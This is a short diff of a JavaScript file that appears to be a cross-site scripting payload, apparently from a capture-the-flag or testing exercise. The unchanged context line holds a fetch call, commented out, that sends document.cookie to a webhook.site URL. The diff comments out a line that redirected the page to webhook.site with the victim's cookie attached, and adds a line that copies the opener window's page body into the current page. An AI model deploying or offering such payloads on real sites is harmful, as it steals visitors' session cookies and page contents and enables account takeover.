@@ -1,2 +1,3 @@
 //fetch("https://webhook.site/2c4d3b1f-f4f9-4529-8f12-cb941e9745a3?cookie="+document.cookie);
-window.location.href = "https://webhook.site/3b86524c-8ac8-4f64-a924-f0b3c0087145?cookie="+document.cookie;
+//window.location.href = "https://webhook.site/3b86524c-8ac8-4f64-a924-f0b3c0087145?cookie="+document.cookie;
+document.body.innerHTML=opener.document.body.innerHTML
